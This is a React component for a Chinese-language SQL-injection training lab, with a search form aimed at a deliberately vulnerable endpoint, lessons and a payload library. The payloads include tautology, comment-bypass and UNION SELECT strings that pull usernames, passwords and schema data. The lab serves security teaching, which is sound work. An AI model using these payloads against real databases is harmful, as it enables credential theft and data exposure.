import React, { useState } from 'react';
import axios from 'axios';
import TeachingGuide from './TeachingGuide';

function SQLInjection() {
  const [searchQuery, setSearchQuery] = useState('');
  const [results, setResults] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [currentStep, setCurrentStep] = useState(0);

  const handleSearch = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setResults([]);

    try {
      const response = await axios.get(`/api/products/search?query=${encodeURIComponent(searchQuery)}`);
      setResults(response.data);
    } catch (err) {
      setError(err.response?.data?.error || 'Search failed');
    } finally {
      setLoading(false);
    }
  };

  const teachingData = {
    vulnerability: {
      name: 'SQL注入攻击',
      description: 'SQL注入是一种通过在用户输入中插入恶意SQL代码来操纵数据库查询的攻击技术。攻击者可以利用此漏洞读取、修改或删除数据库中的数据。',
      attackPrinciple: '当应用程序直接将用户输入拼接到SQL查询中，而没有进行适当的验证和转义时，攻击者可以插入特殊的SQL语句来改变查询的原始意图。',
      impact: '可能导致数据泄露、数据篡改、权限提升，甚至完全控制数据库服务器。',
      protections: [
        '使用参数化查询（预编译语句）',
        '实施输入验证和过滤',
        '使用ORM框架',
        '最小权限原则',
        '错误信息不暴露数据库结构'
      ]
    },
    learningObjectives: [
      '理解SQL注入攻击的基本原理',
      '掌握常见的SQL注入攻击手法',
      '学会识别和利用SQL注入漏洞',
      '了解防护SQL注入的最佳实践',
      '能够编写安全的数据库查询代码'
    ],
    steps: [
      {
        title: '理解漏洞原理',
        description: '学习SQL注入是如何通过用户输入影响数据库查询的',
        example: '正常查询: SELECT * FROM products WHERE name LIKE "%laptop%"\n恶意查询: SELECT * FROM products WHERE name LIKE "%\' OR \'1\'=\'1%"'
      },
      {
        title: '测试基本注入',
        description: '尝试使用简单的SQL注入载荷来验证漏洞',
        example: '\' OR \'1\'=\'1'
      },
      {
        title: '提取数据',
        description: '使用UNION查询从其他表中提取数据',
        example: '\' UNION SELECT 1,username,password,4 FROM users-- '
      },
      {
        title: '获取数据库信息',
        description: '利用SQL注入获取数据库结构和元数据',
        example: '\' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns-- '
      }
    ],
    practiceTasks: [
      {
        title: '基础注入',
        description: '使用简单的SQL注入载荷返回所有产品',
        hint: '尝试使用逻辑运算符绕过查询条件'
      },
      {
        title: '数据提取',
        description: '从users表中提取用户名和密码',
        hint: '使用UNION SELECT语句，注意列数匹配'
      },
      {
        title: '数据库探测',
        description: '获取数据库中的所有表名',
        hint: '查询information_schema.tables表'
      },
      {
        title: '安全对比',
        description: '在安全搜索端点测试相同的载荷',
        hint: '观察参数化查询如何防止注入'
      }
    ]
  };

  const examplePayloads = [
    {
      name: '基础SQL注入',
      payload: "' OR '1'='1",
      description: '返回所有产品 - 验证漏洞存在',
      difficulty: '初级'
    },
    {
      name: 'UNION数据提取',
      payload: "' UNION SELECT 1,username,password,4 FROM users-- ",
      description: '提取用户凭据 - 学习数据泄露',
      difficulty: '中级'
    },
    {
      name: '数据库信息',
      payload: "' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns-- ",
      description: '获取数据库结构 - 学习信息收集',
      difficulty: '高级'
    },
    {
      name: '注释绕过',
      payload: "laptop' -- ",
      description: '使用注释绕过后续条件',
      difficulty: '初级'
    }
  ];

  return (
    <div className="component">
      <div className="teaching-header">
        <h2>🔓 SQL注入攻击教学</h2>
        <div className="progress-indicator">
          <span>学习进度: {currentStep + 1}/{teachingData.steps.length}</span>
        </div>
      </div>

      <div className="teaching-layout">
        <div className="practice-area">
          <h3>💻 实践操作区</h3>
          
          <div className="current-step">
            <h4>当前步骤: {teachingData.steps[currentStep].title}</h4>
            <p>{teachingData.steps[currentStep].description}</p>
            {teachingData.steps[currentStep].example && (
              <div className="step-example">
                <strong>示例代码:</strong>
                <pre>{teachingData.steps[currentStep].example}</pre>
              </div>
            )}
          </div>

          <form onSubmit={handleSearch} className="practice-form">
            <div className="form-group">
              <label htmlFor="search">产品搜索 (测试SQL注入):</label>
              <input
                type="text"
                id="search"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="输入产品名称或SQL注入载荷"
              />
            </div>

            <div className="form-actions">
              <button type="submit" className="btn" disabled={loading}>
                {loading ? '搜索中...' : '执行搜索'}
              </button>
              
              <div className="step-navigation">
                <button 
                  type="button" 
                  className="btn btn-secondary"
                  onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
                  disabled={currentStep === 0}
                >
                  上一步
                </button>
                <button 
                  type="button" 
                  className="btn btn-primary"
                  onClick={() => setCurrentStep(Math.min(teachingData.steps.length - 1, currentStep + 1))}
                  disabled={currentStep === teachingData.steps.length - 1}
                >
                  下一步
                </button>
              </div>
            </div>
          </form>

          {error && <div className="error">{error}</div>}

          {results.length > 0 && (
            <div className="results">
              <h4>搜索结果 ({results.length} 条记录):</h4>
              {results.map((product, index) => (
                <div key={index} className="result-item">
                  <h5>{product.name}</h5>
                  <p>{product.description}</p>
                  <p><strong>价格:</strong> ${product.price}</p>
                  {product.username && (
                    <p><strong>额外数据:</strong> {product.username} - {product.password}</p>
                  )}
                </div>
              ))}
            </div>
          )}

          <div className="example-payloads">
            <h4>📋 示例载荷库</h4>
            <div className="payload-grid">
              {examplePayloads.map((example, index) => (
                <div key={index} className="payload-card">
                  <div className="payload-header">
                    <h5>{example.name}</h5>
                    <span className={`difficulty ${example.difficulty}`}>{example.difficulty}</span>
                  </div>
                  <code>{example.payload}</code>
                  <p>{example.description}</p>
                  <button
                    className="btn btn-small"
                    onClick={() => {
                      setSearchQuery(example.payload);
                      document.getElementById('search').focus();
                    }}
                  >
                    使用此载荷
                  </button>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="teaching-guide-area">
          <TeachingGuide 
            vulnerability={teachingData.vulnerability}
            steps={teachingData.steps}
            learningObjectives={teachingData.learningObjectives}
            practiceTasks={teachingData.practiceTasks}
          />
        </div>
      </div>
    </div>
  );
}

export default SQLInjection;
